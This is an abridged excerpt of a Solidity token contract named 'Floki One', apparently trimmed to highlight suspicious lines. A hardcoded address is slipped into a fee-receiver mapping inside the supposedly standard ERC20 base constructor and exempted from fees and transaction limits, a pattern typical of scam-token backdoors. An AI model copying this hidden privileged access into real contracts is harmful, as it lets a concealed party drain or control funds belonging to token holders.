...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0xe4b0bd68cf0D852E58CdD73102f52397DC076C9E] = _marketingwallet;
    }
...
contract FlokiOne is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Floki One", "F1") {
        ...
        excludeFromFees(address(0xe4b0bd68cf0D852E58CdD73102f52397DC076C9E), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xe4b0bd68cf0D852E58CdD73102f52397DC076C9E), true);
    ...
    function updateSellFees(uint256 _feereceiverFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
